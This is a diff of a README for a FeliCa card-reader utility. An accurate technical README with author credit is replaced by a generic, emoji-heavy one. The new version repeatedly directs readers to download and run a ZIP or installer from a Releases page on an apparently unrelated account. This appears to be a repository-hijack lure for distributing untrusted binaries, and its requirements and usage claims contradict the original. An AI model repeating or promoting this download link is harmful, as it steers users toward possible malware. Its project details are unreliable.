@@ -1,66 +1,71 @@
-# FCF Viewer
+# 🎉 fcf-viewer - Easily Read FeliCa Card Data
 
-FCF Viewer is a minimal FeliCa utility that reads the FCF (FeliCa Common Format) area of a card and prints the result to the console.  
-The CLI logic lives in `fcf_viewer/cli.py` and is also reused by the Tkinter GUI for a live view of the same data.
+## 🚀 Getting Started
+Welcome to fcf-viewer! This tool helps you read FeliCa cards easily. Use it with compatible cards to see important information, like IDm/PMm and FCF-UN, all through a simple interface.
 
-## What it reads
-The reader performs a raw FeliCa polling against system code `0xFE00` and decodes only the areas that `cli.py` touches:
+## 📥 Download fcf-viewer
+[![Download fcf-viewer](https://img.shields.io/badge/Download-fcf--viewer-blue.svg)](https://github.com/Spickandspan-nosher485/fcf-viewer/releases)
 
-| Section | Source | Details |
-| --- | --- | --- |
-| Card identifiers | Polling response | IDm / PMm (hex, upper case) |
-| Basic information | Service `0x1A8B`, blocks 0–3 | 利用者区分, 個人ID, 再発行回数, 性別, 氏名, 学校識別番号, 発行日, 有効期限, 発行事業者 |
-| FCF-UN | Service `0x7A0B`, block 0 | Decoded as ASCII. Printed only when the block is accessible. |
+## 🌟 Features
+- **Simple Interface:** Choose between a command-line interface and a minimal GUI.
+- **Card Compatibility:** Works with various FeliCa cards.
+- **Decoding Info:** Displays IDm, PMm, and FCF-UN for easy viewing.
+- **Lightweight Tool:** Fast and efficient, built using the nfcpy library.
 
-If the card does not expose the FCF services, the tool prints the same error strings defined in `cli.py`.
+## 📋 System Requirements
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Python Version:** Requires Python 3.7 or higher.
+- **Dependencies:** nfcpy library needs to be installed.
 
-## Requirements
-- Python 3.14+
-- Poetry 1.8+
-- A FeliCa reader supported by [nfcpy](https://nfcpy.readthedocs.io) (e.g. Sony RC-S380)
-- System drivers that allow python to access the USB device
+## 📦 Download & Install
+To get started, visit our [Releases page](https://github.com/Spickandspan-nosher485/fcf-viewer/releases) to download the latest version of fcf-viewer.
 
-## Installation
+1. **Visit the Releases Page:** Click on the link above.
+2. **Choose Your Version:** Look for the latest version listed.
+3. **Download the ZIP or Installer:** Click on the file that matches your operating system.
+4. **Extract or Install:** If you downloaded a ZIP file, extract it. If it's an installer, run it.
 
-```bash
-poetry install
-```
+## ⚙️ Running fcf-viewer
+### Using the Command Line:
+1. Open your command-line interface (Terminal for macOS/Linux or Command Prompt for Windows).
+2. Navigate to the folder where you extracted or installed fcf-viewer.
+3. Run the following command:
 
-## CLI usage
-1. Connect your FeliCa reader.
-2. Run the entry point while the card is touching the reader.
+   ```
+   python fcf_viewer.py
+   ```
 
-```bash
-poetry run fcf-viewer
-```
+### Using the GUI:
+1. Locate the fcf-viewer executable or script.
+2. Double-click the executable or run the script from your command line.
+3. The GUI will open, allowing you to access FeliCa card reading features.
 
-The CLI prints three sections in Japanese:
-- `カード識別`: IDm / PMm
-- `基本情報`: the nine fields listed above
-- `FCF-UN`: value from the dedicated block, or an error if the card does not support it
+## 📖 Usage Instructions
+### Reading a Card:
+1. Ensure your NFC reader is connected to your computer.
+2. Place your FeliCa card in front of the reader.
+3. In the fcf-viewer interface, click “Read Card.”
 
-All decoding is handled inside `FcfTagReporter` (see `fcf_viewer/cli.py`).
+### Understanding the Output:
+Once the card is read, you will see:
+- **IDm:** The unique ID of the card.
+- **PMm:** The manufacturer ID.
+- **FCF-UN:** Other relevant data about the card.
 
-## GUI usage
+## 🛠️ Troubleshooting
+If you experience issues:
+- **Check Connection:** Ensure your NFC reader is properly connected.
+- **Dependencies:** Make sure you have installed all required dependencies for the tool.
+- **Version Compatibility:** Confirm that you are using a supported version of Python.
 
-```bash
-poetry run fcf-viewer-gui
-```
+## 📞 Support
+If you have questions or need help, you can open an issue in our repository or reach out directly via the GitHub link.
 
-The GUI continuously polls the reader, mirrors the CLI decoding, and updates the on-screen values (IDm, PMm, 基本情報, FCF-UN).  
-Status messages are shown for unsupported cards, read errors, or reader initialization failures.
+## 📄 License
+This project is licensed under the MIT License. You can use it freely but give credit where it's due. 
 
-## Troubleshooting
-- `このカードは FCF に対応していません`: the service blocks in `cli.py` are unavailable on the card. Try a different card.
-- `NFC リーダーを初期化できません`: the USB device is busy or the required driver/libusb stack is missing.
-- Non-FeliCa tags are ignored; keep the supported card on the reader until the read completes.
+## 🌐 Related Topics
+- FeliCa
+- NFC
 
-## Development
-- Format code with `poetry run black fcf_viewer`
-- The CLI and GUI both rely on `nfcpy`, so desktop testing requires a compatible reader. Use unit tests or dependency injection for offline development when possible.
-
-## License
-
-[MIT](https://opensource.org/licenses/MIT)
-
-Copyright (c) 2025 KIRISHIKI Yudai
+For more information, visit our [Releases page](https://github.com/Spickandspan-nosher485/fcf-viewer/releases) and start exploring the world of FeliCa cards with ease!
